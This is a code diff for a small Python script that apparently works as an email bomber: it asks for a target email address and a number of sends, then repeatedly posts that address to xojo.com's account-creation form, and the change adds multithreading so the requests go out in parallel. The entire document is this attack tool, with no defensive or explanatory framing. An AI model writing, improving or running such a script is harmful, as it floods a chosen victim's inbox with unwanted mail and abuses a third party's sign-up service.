@@ -7,6 +7,7 @@ import requests
 from time import sleep
 from colorama import init
 from os import name,system
+import threading
 
 init(autoreset=True)
 
@@ -40,17 +41,20 @@ print(f'''
 
 ind = input(f"{color.uwhite}Enter E-Mail Address: ")
 num = int(input(f"{color.uwhite}Number Of E-Mails to send: "))
+xdx = int(input("Enter number of threads: "))
 
 data = {'process':1,
         'emailaddress':'',
         'email':ind}
 
-clear()
-for xyz in range(num):
-	try:
-		r = requests.post(url = "https://xojo.com/account/create/", data = data)
-		print(f"{color.ugreen}Request: OK")
-	except Exception:
-		print(f"{color.ured}Request: FAILED!")
-print("Done!")
-sleep(3)
+def main():
+    for xyz in range(num):
+        try:
+            r = requests.post(url = "https://xojo.com/account/create/", data = data)
+            print(f"{color.ugreen}Request: OK")
+        except Exception:
+            print(f"{color.ured}Request: FAILED!")
+    print("Done!")
+
+for zet in range(xdx):
+    threading.Thread(target=main).start()
